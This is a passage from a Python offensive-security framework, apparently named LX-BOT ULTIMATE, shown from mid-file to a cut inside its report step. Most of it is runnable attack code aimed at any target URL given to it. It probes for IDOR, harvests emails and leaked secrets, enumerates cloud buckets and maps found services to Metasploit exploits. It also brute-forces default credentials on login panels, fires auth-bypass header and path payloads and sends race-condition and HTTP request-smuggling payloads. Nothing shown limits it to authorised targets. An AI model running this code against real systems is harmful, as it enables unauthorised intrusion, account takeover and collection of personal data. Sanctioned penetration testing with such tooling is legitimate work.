        for url in id_urls[:20]:
            # Get baseline response
            rc1, out1, _ = await self.runner.run(
                f'curl -sk --max-time 10 {proxy_opt} "{url}" 2>/dev/null',
                timeout=15, tag='idor-base'
            )

            # Try sequential ID (IDOR probe)
            m = re.search(r'(\d+)', url)
            if not m:
                continue
            orig_id = int(m.group(1))
            test_id = orig_id - 1 if orig_id > 1 else orig_id + 1
            test_url = url.replace(str(orig_id), str(test_id), 1)

            rc2, out2, _ = await self.runner.run(
                f'curl -sk --max-time 10 {proxy_opt} "{test_url}" 2>/dev/null',
                timeout=15, tag='idor-probe'
            )

            # Compare: if both return 200 and different non-empty content
            if (rc2 == 0 and len(out2) > 50 and
                    out2 != out1 and len(out2) > 100 and
                    'error' not in out2.lower()[:50] and
                    'not found' not in out2.lower()[:50]):
                entry = {
                    'name':        'Insecure Direct Object Reference (IDOR)',
                    'severity':    'high',
                    'url':         test_url,
                    'description': f'Object ID manipulation: {orig_id}→{test_id} returned different data',
                    'tool':        'idor-probe',
                }
                idor_results.append(entry)
                self.store.add_vuln(entry)
                print_finding('high', 'IDOR Potential!', test_url,
                              f'ID {orig_id} → {test_id} returns different response')

        self.store.add('idor_results', idor_results)
        print_ok(f'IDOR testing: {len(idor_results)} potential findings')

    def _print_summary(self):
        results = {
            'XSS':          len(self.store.get('xss_results', [])),
            'SQLi':         len(self.store.get('sqli_results', [])),
            'LFI/RFI':      len(self.store.get('lfi_rfi_results', [])),
            'SSTI':         len(self.store.get('ssti_results', [])),
            'SSRF':         len(self.store.get('ssrf_results', [])),
            'XXE':          len(self.store.get('xxe_results', [])),
            'CMDi':         len(self.store.get('command_injection', [])),
            'Open Redirect':len(self.store.get('open_redirects', [])),
            'IDOR':         len(self.store.get('idor_results', [])),
        }
        tbl = Table(title='Phase 7 – Injection Summary', box=box.ROUNDED, border_style='cyan')
        tbl.add_column('Type', style='bold cyan')
        tbl.add_column('Findings', justify='right')
        for vuln_type, count in results.items():
            style = '[bold red]' if count > 0 else ''
            end   = '[/bold red]' if count > 0 else ''
            tbl.add_row(vuln_type, f'{style}{count}{end}')
        console.print(tbl)


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 8 — OSINT & INTELLIGENCE
# ═══════════════════════════════════════════════════════════════════════════

class Phase8OSINT:
    """
    Phase 8: Open-Source Intelligence gathering.
    Tools: theHarvester, trufflehog, gitleaks, gitrob
    Covers: email harvesting, credential leaks, GitHub secrets, S3 buckets
    """

    def __init__(
        self,
        runner:  AsyncRunner,
        store:   ResultsStore,
        proxy:   Optional[str] = None,
        threads: int = 10,
    ):
        self.runner  = runner
        self.store   = store
        self.proxy   = proxy
        self.threads = threads
        self.domain  = store.domain
        self.target  = store.target
        self.outdir  = store.output_dir

    async def run(self):
        print_phase_header(
            8, 'OSINT & INTELLIGENCE GATHERING',
            ['theHarvester', 'trufflehog', 'gitleaks', 'gitrob',
             's3-enum', 'email-hunter']
        )
        await asyncio.gather(
            self._theharvester(),
            self._s3_bucket_enum(),
        )
        await asyncio.gather(
            self._trufflehog(),
            self._gitleaks(),
            self._gitrob(),
        )
        self._print_summary()

    async def _theharvester(self):
        print_tool('theHarvester', f'Email & OSINT gathering: {self.domain}')
        if not tool_exists('theHarvester'):
            return

        outfile = self.outdir / 'harvester.json'
        rc, out, _ = await self.runner.run(
            f'theHarvester -d {self.domain} '
            f'-b google,bing,yahoo,duckduckgo,crtsh,otx,urlscan '
            f'-l 200 -f {outfile} 2>/dev/null',
            timeout=300, tag='theharvester'
        )
        emails = re.findall(r'[a-zA-Z0-9._%+\-]+@' + re.escape(self.domain), out)
        if outfile.with_suffix('.json').exists():
            try:
                data = json.loads(outfile.with_suffix('.json').read_text())
                emails += data.get('emails', [])
            except Exception:
                pass

        emails = list(set(e.lower() for e in emails))
        self.store.set('emails', emails)
        print_ok(f'theHarvester: {len(emails)} emails found')
        for email in emails[:5]:
            print_info(f'Email: {email}')

    async def _trufflehog(self):
        if not tool_exists('trufflehog'):
            return
        print_tool('trufflehog', f'Secret scanning: {self.target}')
        rc, out, _ = await self.runner.run(
            f'trufflehog --json git https://github.com/{self.domain} 2>/dev/null || '
            f'trufflehog --json filesystem {self.outdir} 2>/dev/null',
            timeout=300, tag='trufflehog'
        )
        secrets = []
        for line in out.splitlines():
            try:
                entry = json.loads(line)
                if entry.get('stringsFound') or entry.get('reason'):
                    secrets.append({
                        'type':   entry.get('reason', 'Secret'),
                        'value':  str(entry.get('stringsFound', []))[:80],
                        'source': entry.get('path', ''),
                    })
                    print_finding('high', f'Secret: {entry.get("reason","?")}',
                                  entry.get('path',''), str(entry.get('stringsFound',''))[:60])
            except Exception:
                pass
        self.store.add('github_secrets', secrets)
        self.store.inc('secrets', len(secrets))
        print_ok(f'trufflehog: {len(secrets)} secrets found')

    async def _gitleaks(self):
        if not tool_exists('gitleaks'):
            return
        print_tool('gitleaks', 'Git secret detection')
        git_dump = self.outdir / 'git_dump'
        if not git_dump.exists():
            # Try scanning web-fetched content
            rc, out, _ = await self.runner.run(
                f'gitleaks detect --source={self.outdir} '
                f'--report-format=json --report-path={self.outdir}/gitleaks.json '
                f'--no-git --redact 2>/dev/null',
                timeout=120, tag='gitleaks'
            )
        else:
            rc, out, _ = await self.runner.run(
                f'gitleaks detect --source={git_dump} '
                f'--report-format=json --report-path={self.outdir}/gitleaks.json '
                f'--redact 2>/dev/null',
                timeout=120, tag='gitleaks'
            )
        report = self.outdir / 'gitleaks.json'
        if report.exists():
            try:
                data = json.loads(report.read_text())
                for finding in data if isinstance(data, list) else []:
                    secret_entry = {
                        'type':   finding.get('RuleID', 'secret'),
                        'file':   finding.get('File', ''),
                        'value':  finding.get('Secret', '')[:80],
                        'commit': finding.get('Commit', ''),
                    }
                    self.store.add('leaked_credentials', secret_entry)
                    self.store.add_vuln({
                        'name':        f'Leaked Secret ({finding.get("RuleID","")})',
                        'severity':    'critical',
                        'url':         self.target,
                        'description': f'Secret found in code: {finding.get("Match","")}',
                        'tool':        'gitleaks',
                    })
                    print_finding('critical', f'SECRET LEAKED: {finding.get("RuleID","")}',
                                  finding.get('File',''))
            except Exception:
                pass

    async def _gitrob(self):
        if not tool_exists('gitrob'):
            return
        print_tool('gitrob', 'GitHub organisation reconnaissance')
        rc, out, _ = await self.runner.run(
            f'gitrob --github-access-token {os.environ.get("GITHUB_TOKEN","")} '
            f'--output-file={self.outdir}/gitrob.json '
            f'--save-to-csv=false '
            f'{self.domain} 2>/dev/null',
            timeout=300, tag='gitrob'
        )
        if 'commit' in out.lower() or 'secret' in out.lower():
            print_info('gitrob: potential secrets found in GitHub')

    async def _s3_bucket_enum(self):
        print_tool('s3-enum', 'S3/GCS bucket enumeration')
        bucket_names = [
            self.domain,
            self.domain.replace('.', '-'),
            f'{self.domain}-backup',
            f'{self.domain}-assets',
            f'{self.domain}-media',
            f'{self.domain}-uploads',
            f'{self.domain}-static',
            f'{self.domain}-data',
            f'{self.domain}-logs',
            f'{self.domain}-dev',
            f'{self.domain}-staging',
            f'{self.domain}-prod',
            f'www.{self.domain}',
        ]
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        s3_findings = []

        for name in bucket_names:
            s3_url = f'https://{name}.s3.amazonaws.com/'
            gcs_url = f'https://storage.googleapis.com/{name}/'

            for bucket_url in [s3_url, gcs_url]:
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 8 {proxy_opt} -o /dev/null '
                    f'-w "%{{http_code}}" {bucket_url} 2>/dev/null',
                    timeout=12, tag='s3-enum'
                )
                code = out.strip()
                if code in ('200', '403'):
                    finding = {
                        'url':    bucket_url,
                        'status': int(code),
                        'public': code == '200',
                    }
                    s3_findings.append(finding)
                    sev = 'critical' if code == '200' else 'medium'
                    desc = 'Public read access – sensitive data exposure' if code == '200' else 'Bucket exists (forbidden – may have misconfigured ACL)'
                    self.store.add_vuln({
                        'name':        f'{"Public " if code=="200" else ""}S3/GCS Bucket Found: {name}',
                        'severity':    sev,
                        'url':         bucket_url,
                        'description': desc,
                        'tool':        's3-enum',
                    })
                    print_finding(sev, f'Bucket [{code}]: {bucket_url}')

        self.store.set('s3_buckets', s3_findings)
        print_ok(f'S3 enum: {len(s3_findings)} buckets found')

    def _print_summary(self):
        emails  = len(self.store.get('emails', []))
        secrets = len(self.store.get('github_secrets', []))
        creds   = len(self.store.get('leaked_credentials', []))
        s3      = len(self.store.get('s3_buckets', []))
        console.print(
            f'\n  [bold green]Emails: {emails}  '
            f'Secrets: {secrets}  '
            f'Leaked Creds: {creds}  '
            f'Buckets: {s3}[/bold green]'
        )


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 9 — EXPLOIT RESEARCH & CVE CORRELATION
# ═══════════════════════════════════════════════════════════════════════════

class Phase9Exploits:
    """
    Phase 9: CVE correlation, exploit research, Metasploit module mapping.
    Tools: searchsploit, msfconsole, CVE databases
    """

    def __init__(
        self,
        runner:     AsyncRunner,
        store:      ResultsStore,
        msf:        MetasploitIntegration,
        proxy:      Optional[str] = None,
    ):
        self.runner  = runner
        self.store   = store
        self.msf     = msf
        self.proxy   = proxy
        self.domain  = store.domain
        self.target  = store.target
        self.outdir  = store.output_dir

    async def run(self):
        print_phase_header(
            9, 'EXPLOIT RESEARCH & CVE CORRELATION',
            ['searchsploit', 'msfconsole', 'CVE-DB', 'exploit-db']
        )
        await asyncio.gather(
            self._service_exploit_research(),
            self._cve_correlation(),
            self._cms_exploit_search(),
        )
        await self._metasploit_module_mapping()
        self._print_summary()

    async def _service_exploit_research(self):
        """Search exploits for discovered services."""
        services = self.store.get('services', [])
        all_results = []

        for svc in services:
            product = svc.get('product', '')
            version = svc.get('version', '')
            if not product:
                continue
            query = f'{product} {version}'.strip()[:60]
            results = await self.msf.searchsploit_lookup(query)
            if results:
                all_results.extend(results)
                print_ok(f'searchsploit [{query}]: {len(results)} exploits')
                for r in results[:3]:
                    sev = 'critical' if 'rce' in r.get('title','').lower() else 'high'
                    print_finding(sev, r.get('title','')[:70], svc.get('ip',''), r.get('url',''))
                    self.store.add_vuln({
                        'name':        f'Known Exploit: {r.get("title","")}',
                        'severity':    sev,
                        'url':         f'{svc.get("ip","")}:{svc.get("port","")}',
                        'description': f'Exploit-DB: {r.get("url","")}',
                        'tool':        'searchsploit',
                    })
                self.store.inc('exploits', len(results))

        self.store.set('searchsploit_results', all_results)
        print_ok(f'Exploit research: {len(all_results)} total exploits found')

    async def _cve_correlation(self):
        """Correlate CVEs from nuclei findings with searchsploit."""
        nuclei_findings = self.store.get('nuclei_findings', [])
        cve_list = []

        for finding in nuclei_findings:
            cves = finding.get('cve', [])
            for cve in cves:
                if cve and re.match(r'CVE-\d{4}-\d+', cve, re.IGNORECASE):
                    cve_list.append(cve.upper())

        cve_list = list(set(cve_list))
        cve_matches = []

        for cve in cve_list[:20]:
            results = await self.msf.searchsploit_lookup(cve)
            msf_modules = await self.msf.search_modules(cve)
            entry = {
                'cve':             cve,
                'exploitdb':       results,
                'msf_modules':     msf_modules,
            }
            cve_matches.append(entry)

            if results or msf_modules:
                sev = 'critical' if msf_modules else 'high'
                print_finding(sev, f'{cve} – {len(results)} exploits, {len(msf_modules)} MSF modules',
                              self.target)

        self.store.set('cve_matches', cve_matches)

    async def _cms_exploit_search(self):
        """Search CMS-specific exploits."""
        cms = self.store.get('cms_type')
        if not cms:
            return
        print_tool('searchsploit', f'CMS exploit search: {cms}')
        results = await self.msf.searchsploit_lookup(cms)
        if results:
            print_ok(f'CMS exploits ({cms}): {len(results)} found')
            self.store.add('searchsploit_results', results)

    async def _metasploit_module_mapping(self):
        """Map discovered services to Metasploit auxiliary/exploit modules."""
        services = self.store.get('services', [])
        all_modules = []

        service_map = {
            'ftp':     ['ftp', 'vsftpd'],
            'ssh':     ['ssh', 'openssh'],
            'http':    ['http', 'apache', 'nginx', 'iis'],
            'smb':     ['smb', 'ms17_010', 'eternalblue'],
            'rdp':     ['rdp', 'ms12_020', 'bluekeep'],
            'mssql':   ['mssql'],
            'mysql':   ['mysql'],
            'redis':   ['redis'],
            'mongodb': ['mongodb'],
        }

        for svc in services:
            svc_name = svc.get('service', '').lower()
            for key, search_terms in service_map.items():
                if key in svc_name:
                    for term in search_terms[:1]:
                        modules = await self.msf.search_modules(term)
                        if modules:
                            all_modules.extend(modules)
                            high_rank = [m for m in modules if m.get('rank') in ('excellent','great','good')]
                            if high_rank:
                                print_ok(f'MSF [{term}]: {len(high_rank)} high-rank modules')
                                for m in high_rank[:2]:
                                    print_info(f'  [{m.get("rank","").upper()}] {m.get("path","")}')

        self.store.set('metasploit_modules', all_modules)
        print_ok(f'Metasploit: {len(all_modules)} modules mapped')

    def _print_summary(self):
        exploits = len(self.store.get('searchsploit_results', []))
        cves     = len(self.store.get('cve_matches', []))
        msf      = len(self.store.get('metasploit_modules', []))
        console.print(
            f'\n  [bold green]Exploits: {exploits}  CVEs: {cves}  MSF Modules: {msf}[/bold green]'
        )
        if exploits or msf:
            console.print(
                f'  [bold red]⚠  Active exploits exist for discovered vulnerabilities![/bold red]'
            )


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 10 — ADVANCED ATTACKS
# ═══════════════════════════════════════════════════════════════════════════

class Phase10Advanced:
    """
    Phase 10: Advanced attack techniques.
    Covers: Race conditions, HTTP parameter pollution, auth bypass,
    default credentials, HTTP smuggling indicators, JWT attacks.
    """

    def __init__(
        self,
        runner:  AsyncRunner,
        store:   ResultsStore,
        proxy:   Optional[str] = None,
        threads: int = 10,
    ):
        self.runner  = runner
        self.store   = store
        self.proxy   = proxy
        self.threads = threads
        self.domain  = store.domain
        self.target  = store.target
        self.outdir  = store.output_dir

    async def run(self):
        print_phase_header(
            10, 'ADVANCED ATTACKS & MISCELLANEOUS',
            ['race-condition', 'http-param-pollution', 'auth-bypass',
             'default-creds', 'jwt-attacks', 'http-smuggling']
        )
        await asyncio.gather(
            self._race_condition(),
            self._http_param_pollution(),
            self._auth_bypass(),
            self._jwt_analysis(),
            self._http_request_smuggling(),
        )
        await self._default_credentials()
        self._print_summary()

    # ── Race Condition ────────────────────────────────────────────────────

    async def _race_condition(self):
        print_tool('race-probe', 'Race condition detection (Limit Overrun)')
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''

        # Find coupon/transfer/purchase endpoints
        race_targets = [
            u for u in self.store.get('crawled_urls', [])
            if re.search(r'(coupon|discount|transfer|pay|purchase|redeem|apply|vote|like)',
                         u, re.IGNORECASE) and '?' in u
        ]
        if not race_targets:
            race_targets = [self.target + '/api/redeem', self.target + '/coupon/apply']

        race_results = []
        for url in race_targets[:3]:
            # Send 25 simultaneous requests
            print_info(f'Race condition test: {url[:60]}')
            tasks = []
            for _ in range(25):
                tasks.append(self.runner.run(
                    f'curl -sk --max-time 5 {proxy_opt} '
                    f'-X POST -d "code=TEST100" "{url}" 2>/dev/null',
                    timeout=10, tag='race'
                ))
            results_list = await asyncio.gather(*tasks)
            success_count = sum(1 for rc, out, _ in results_list
                                if rc == 0 and re.search(r'success|applied|valid|200', out, re.IGNORECASE))
            if success_count > 1:
                entry = {
                    'url':     url,
                    'hits':    success_count,
                    'total':   25,
                }
                race_results.append(entry)
                self.store.add_vuln({
                    'name':        'Race Condition (Limit Overrun)',
                    'severity':    'high',
                    'url':         url,
                    'description': f'{success_count}/25 concurrent requests succeeded',
                    'tool':        'race-probe',
                })
                print_finding('high', f'Race Condition! {success_count}/25 wins', url)

        self.store.set('race_conditions', race_results)

    # ── HTTP Parameter Pollution ──────────────────────────────────────────

    async def _http_param_pollution(self):
        print_tool('hpp-probe', 'HTTP Parameter Pollution')
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        hpp_results = []

        for url in self.store.get('api_endpoints', [])[:10]:
            ep_url = url.get('url','') if isinstance(url, dict) else url
            # Duplicate a parameter
            if '?' not in ep_url:
                continue
            param_name = re.search(r'\?(\w+)=', ep_url)
            if not param_name:
                continue
            param = param_name.group(1)
            test_url = ep_url + f'&{param}=injected_value'

            rc, out, _ = await self.runner.run(
                f'curl -sk --max-time 8 {proxy_opt} "{test_url}" 2>/dev/null',
                timeout=12, tag='hpp'
            )
            if 'injected_value' in out:
                hpp_results.append({'url': test_url})
                self.store.add_vuln({
                    'name':        'HTTP Parameter Pollution',
                    'severity':    'medium',
                    'url':         test_url,
                    'description': f'Duplicate parameter "{param}" reflected in response',
                    'tool':        'hpp-probe',
                })
                print_finding('medium', 'HTTP Parameter Pollution!', test_url, param)

        print_ok(f'HPP testing: {len(hpp_results)} findings')

    # ── Authentication Bypass ─────────────────────────────────────────────

    async def _auth_bypass(self):
        print_tool('auth-bypass', 'Authentication bypass techniques')
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        bypass_results = []

        # Collect auth-protected endpoints (401/403)
        protected = [
            d.get('url','') for d in self.store.get('directories', [])
            if d.get('status') in (401, 403)
        ]
        if not protected:
            protected = [self.target + '/admin', self.target + '/administrator']

        bypass_headers = [
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Forwarded-For', '127.0.0.1'),
            ('X-Remote-IP', '127.0.0.1'),
            ('X-Client-IP', '127.0.0.1'),
            ('X-Host', '127.0.0.1'),
            ('X-Custom-IP-Authorization', '127.0.0.1'),
        ]

        path_bypasses = [
            '/admin', '/admin/', '//admin//', '/admin/.',
            '/ADMIN', '/Admin', '/%61dmin',
            '/admin%2F', '/admin;/', '/admin;param=1',
        ]

        for base_url in protected[:5]:
            # Header-based bypass
            for header, value in bypass_headers:
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 8 {proxy_opt} '
                    f'-H "{header}: {value}" '
                    f'-o /dev/null -w "%{{http_code}}" '
                    f'"{base_url}" 2>/dev/null',
                    timeout=12, tag='auth-bypass'
                )
                if out.strip() in ('200', '201', '302'):
                    entry = {
                        'url':     base_url,
                        'header':  header,
                        'value':   value,
                        'code':    out.strip(),
                    }
                    bypass_results.append(entry)
                    self.store.add_vuln({
                        'name':        f'Authentication Bypass via {header}',
                        'severity':    'critical',
                        'url':         base_url,
                        'description': f'Header {header}: {value} bypasses 401/403 → {out.strip()}',
                        'tool':        'auth-bypass',
                    })
                    print_finding('critical', f'Auth Bypass! {header}: {value}',
                                  base_url, f'Response: {out.strip()}')

            # Path-based bypass
            parsed = urlparse(base_url)
            base = f'{parsed.scheme}://{parsed.netloc}'
            for path in path_bypasses:
                test_url = base + path
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 8 {proxy_opt} '
                    f'-o /dev/null -w "%{{http_code}}" '
                    f'"{test_url}" 2>/dev/null',
                    timeout=12, tag='auth-bypass-path'
                )
                if out.strip() == '200':
                    bypass_results.append({'url': test_url, 'bypass': 'path-manipulation'})
                    self.store.add_vuln({
                        'name':        'Authentication Bypass via Path Manipulation',
                        'severity':    'critical',
                        'url':         test_url,
                        'description': f'Path {path} bypasses access control',
                        'tool':        'auth-bypass',
                    })
                    print_finding('critical', f'Path Bypass! {path}', test_url)

        self.store.set('auth_bypass', bypass_results)
        print_ok(f'Auth bypass: {len(bypass_results)} bypasses found')

    # ── Default Credentials ────────────────────────────────────────────────

    async def _default_credentials(self):
        print_tool('default-creds', 'Default credential testing')
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        creds_found = []

        # Common login panels
        login_paths = [
            '/admin', '/admin/login', '/administrator',
            '/login', '/wp-admin', '/phpmyadmin',
            '/manager/html', '/console', '/dashboard',
            '/panel', '/backend', '/cms', '/control',
        ]

        live_hosts = self.store.get('live_hosts', [])
        base_urls = [
            h.get('url', h) if isinstance(h, dict) else h
            for h in live_hosts[:3]
        ] or [self.target]

        for base_url in base_urls:
            for path in login_paths[:5]:
                login_url = base_url.rstrip('/') + path
                # Check if page exists
                rc_check, check_out, _ = await self.runner.run(
                    f'curl -sk --max-time 8 {proxy_opt} -o /dev/null '
                    f'-w "%{{http_code}}" "{login_url}" 2>/dev/null',
                    timeout=12, tag='cred-check'
                )
                if check_out.strip() not in ('200', '401'):
                    continue

                # Try default credentials
                for username, password in DEFAULT_CREDS[:15]:
                    rc, out, _ = await self.runner.run(
                        f'curl -sk --max-time 8 {proxy_opt} '
                        f'-c /tmp/lxbot_cookies.txt '
                        f'-b /tmp/lxbot_cookies.txt '
                        f'-X POST '
                        f'-d "username={username}&password={password}&user={username}&pass={password}&log={username}&pwd={password}" '
                        f'-H "Content-Type: application/x-www-form-urlencoded" '
                        f'-D - '
                        f'"{login_url}" 2>/dev/null',
                        timeout=15, tag='default-creds'
                    )
                    # Check for successful login indicators
                    if (re.search(r'(dashboard|logout|welcome|profile|admin panel)',
                                  out, re.IGNORECASE) and
                            not re.search(r'(invalid|incorrect|failed|error|wrong)',
                                          out, re.IGNORECASE) and
                            'location:' not in out.lower()):
                        entry = {
                            'url':      login_url,
                            'username': username,
                            'password': password,
                        }
                        creds_found.append(entry)
                        self.store.add_vuln({
                            'name':        'Default Credentials Accepted',
                            'severity':    'critical',
                            'url':         login_url,
                            'description': f'Login with {username}:{password} succeeded',
                            'tool':        'default-creds',
                        })
                        print_finding('critical', f'DEFAULT CREDS: {username}:{password}',
                                      login_url, 'LOGIN SUCCESSFUL!')
                        break

        self.store.set('default_creds', creds_found)
        print_ok(f'Default creds: {len(creds_found)} successful logins')

    # ── JWT Analysis ──────────────────────────────────────────────────────

    async def _jwt_analysis(self):
        print_tool('jwt-probe', 'JWT security analysis')
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        jwt_issues = []

        # Collect JWTs from responses
        all_headers = self.store.get('headers', {})
        for url, headers in all_headers.items():
            auth_header = headers.get('authorization', '')
            cookie = headers.get('set-cookie', '')
            jwt_matches = re.findall(
                r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+',
                auth_header + cookie
            )
            for jwt in jwt_matches:
                issues = await self._test_jwt(jwt, url)
                jwt_issues.extend(issues)

        # Also probe API endpoints for JWTs
        api_eps = self.store.get('api_endpoints', [])
        for ep in api_eps[:5]:
            ep_url = ep.get('url','') if isinstance(ep, dict) else ep
            rc, out, _ = await self.runner.run(
                f'curl -sk --max-time 8 {proxy_opt} {ep_url} 2>/dev/null',
                timeout=12, tag='jwt-probe'
            )
            jwt_matches = re.findall(
                r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*',
                out
            )
            for jwt in jwt_matches[:3]:
                issues = await self._test_jwt(jwt, ep_url)
                jwt_issues.extend(issues)

        print_ok(f'JWT analysis: {len(jwt_issues)} issues found')

    async def _test_jwt(self, jwt: str, url: str) -> List[Dict[str, Any]]:
        """Test JWT for common vulnerabilities."""
        import base64 as b64
        issues = []

        try:
            # Decode header and payload (no verification)
            parts = jwt.split('.')
            if len(parts) != 3:
                return issues

            def b64_decode(s):
                s += '=' * (4 - len(s) % 4)
                return json.loads(b64.urlsafe_b64decode(s).decode('utf-8', errors='replace'))

            header  = b64_decode(parts[0])
            payload = b64_decode(parts[1])

            alg = header.get('alg', 'unknown').upper()

            # alg: none attack
            if alg in ('NONE', 'none'):
                issues.append({
                    'name':     'JWT Algorithm None',
                    'severity': 'critical',
                    'url':      url,
                    'detail':   'JWT uses "none" algorithm – signature verification disabled',
                })
                self.store.add_vuln({
                    'name':        'JWT Algorithm None Attack',
                    'severity':    'critical',
                    'url':         url,
                    'description': 'JWT header specifies alg:none – no signature required',
                    'tool':        'jwt-probe',
                })
                print_finding('critical', 'JWT Algorithm None!', url)

            # Weak algorithm
            if alg in ('HS256', 'HS384', 'HS512'):
                issues.append({
                    'name':     f'JWT Weak Algorithm ({alg})',
                    'severity': 'medium',
                    'url':      url,
                    'detail':   'Symmetric JWT – secret could be brute-forced',
                })

            # Check for sensitive data in payload
            sensitive_keys = ['password', 'pass', 'secret', 'token', 'key', 'ssn', 'credit_card']
            for key in sensitive_keys:
                if key in [k.lower() for k in payload.keys()]:
                    issues.append({
                        'name':     'Sensitive Data in JWT Payload',
                        'severity': 'high',
                        'url':      url,
                        'detail':   f'Sensitive key in JWT payload: {key}',
                    })
                    self.store.add_vuln({
                        'name':        'Sensitive Data Exposed in JWT',
                        'severity':    'high',
                        'url':         url,
                        'description': f'JWT payload contains "{key}" – data exposed in client token',
                        'tool':        'jwt-probe',
                    })
                    print_finding('high', f'Sensitive JWT data: {key}', url)

        except Exception:
            pass

        return issues

    # ── HTTP Request Smuggling ────────────────────────────────────────────

    async def _http_request_smuggling(self):
        print_tool('smuggling-probe', 'HTTP Request Smuggling detection')
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''

        parsed = urlparse(self.target)
        host   = parsed.hostname or self.domain
        port   = parsed.port or (443 if parsed.scheme == 'https' else 80)

        # CL.TE probe
        cl_te_payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n\r\n"
            "1\r\na\r\n0\r\n\r\n"
        )

        # TE.CL probe
        te_cl_payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n\r\n"
            "0\r\n\r\nX"
        )

        for payload in [cl_te_payload, te_cl_payload]:
            payload_file = self.outdir / f'smuggle_{hash(payload) & 0xFFFF}.bin'
            payload_file.write_bytes(payload.encode('utf-8', errors='replace'))
            rc, out, _ = await self.runner.run(
                f'curl -sk --max-time 10 {proxy_opt} '
                f'--http1.1 --path-as-is '
                f'-H "Transfer-Encoding: chunked" '
                f'--data-binary @{payload_file} '
                f'{self.target} 2>/dev/null',
                timeout=15, tag='smuggling'
            )
            # Look for timing differences or error responses indicating smuggling
            if 'timeout' in out.lower() or rc == -1:
                self.store.add_vuln({
                    'name':        'HTTP Request Smuggling (Potential)',
                    'severity':    'high',
                    'url':         self.target,
                    'description': 'Anomalous response to smuggling probe – manual verification required',
                    'tool':        'smuggling-probe',
                })
                print_finding('high', 'Potential HTTP Request Smuggling', self.target)
                break

        print_ok('HTTP smuggling probe complete')

    def _print_summary(self):
        race    = len(self.store.get('race_conditions', []))
        bypass  = len(self.store.get('auth_bypass', []))
        creds   = len(self.store.get('default_creds', []))
        console.print(
            f'\n  [bold green]Race Conditions: {race}  '
            f'Auth Bypasses: {bypass}  '
            f'Default Creds: {creds}[/bold green]'
        )
        if bypass or creds:
            console.print('  [bold red]⚠  CRITICAL access control issues found![/bold red]')


# ═══════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════

class LXBotUltimate:
    """
    LX-BOT ULTIMATE v5.0 – Main orchestrator.
    Coordinates all 10 phases, manages output, generates final report.
    """

    def __init__(
        self,
        target:       str,
        proxy:        Optional[str] = None,
        threads:      int = 20,
        output_dir:   Optional[str] = None,
        skip_heavy:   bool = False,
        only_phases:  Optional[List[int]] = None,
        wpscan_api:   Optional[str] = None,
        github_token: Optional[str] = None,
    ):
        self.target       = normalise_url(target)
        self.proxy        = proxy
        self.threads      = threads
        self.skip_heavy   = skip_heavy
        self.only_phases  = only_phases or list(range(1, 11))
        self.domain       = extract_domain(target)

        # Set API tokens in environment
        if wpscan_api:
            os.environ['WPSCAN_API'] = wpscan_api
        if github_token:
            os.environ['GITHUB_TOKEN'] = github_token

        # Setup output directory
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        base_dir  = Path(output_dir) if output_dir else Path('lx-bot-results')
        self.outdir = base_dir / self.domain / timestamp
        self.outdir.mkdir(parents=True, exist_ok=True)

        # Core engine
        self.runner = AsyncRunner(semaphore=threads)
        self.store  = ResultsStore(self.target, self.domain, self.outdir)
        self.msf    = MetasploitIntegration(self.runner)

        # Proxy setup
        if proxy:
            self._setup_proxy(proxy)

    def _setup_proxy(self, proxy: str):
        """Configure proxy environment variables."""
        os.environ.update({
            'http_proxy':  proxy, 'HTTP_PROXY':  proxy,
            'https_proxy': proxy, 'HTTPS_PROXY': proxy,
            'ALL_PROXY':   proxy,
        })
        print_info(f'Proxy configured: {proxy}')

    # ── entry point ───────────────────────────────────────────────────────

    async def run(self):
        """Execute all phases in sequence."""
        self._print_banner()
        start = time.time()

        phase_map = {
            1:  lambda: Phase1Recon(self.runner, self.store, self.proxy, self.threads).run(),
            2:  lambda: Phase2Ports(self.runner, self.store, self.proxy, self.threads).run(),
            3:  lambda: Phase3Web(self.runner, self.store, self.proxy, self.threads).run(),
            4:  lambda: Phase4API(self.runner, self.store, self.proxy, self.threads).run(),
            5:  lambda: Phase5Content(self.runner, self.store, self.proxy, self.threads).run(),
            6:  lambda: Phase6Nuclei(self.runner, self.store, self.proxy, self.threads).run(),
            7:  lambda: Phase7Injections(self.runner, self.store, self.proxy, self.threads).run(),
            8:  lambda: Phase8OSINT(self.runner, self.store, self.proxy, self.threads).run(),
            9:  lambda: Phase9Exploits(self.runner, self.store, self.msf, self.proxy).run(),
            10: lambda: Phase10Advanced(self.runner, self.store, self.proxy, self.threads).run(),
        }

        for phase_num in self.only_phases:
            if phase_num not in phase_map:
                continue
            try:
                await phase_map[phase_num]()
                self.store.save_json()
            except KeyboardInterrupt:
                console.print('\n[bold yellow]⚠ Interrupted – saving results...[/bold yellow]')
                break
            except Exception as exc:
                print_err(f'Phase {phase_num} error: {exc}')
                import traceback
                console.print(f'[dim]{traceback.format_exc()[:500]}[/dim]')

        elapsed = time.time() - start
        await self._finalize(elapsed)

    async def _finalize(self, elapsed: float):
        """Generate report and print final summary."""
        self.store.save_json()
        json_path = self.outdir / f'{self.domain}_results.json'

        # Generate HTML report
        report_path = None
        if HAS_REPORT_GEN:
            try:
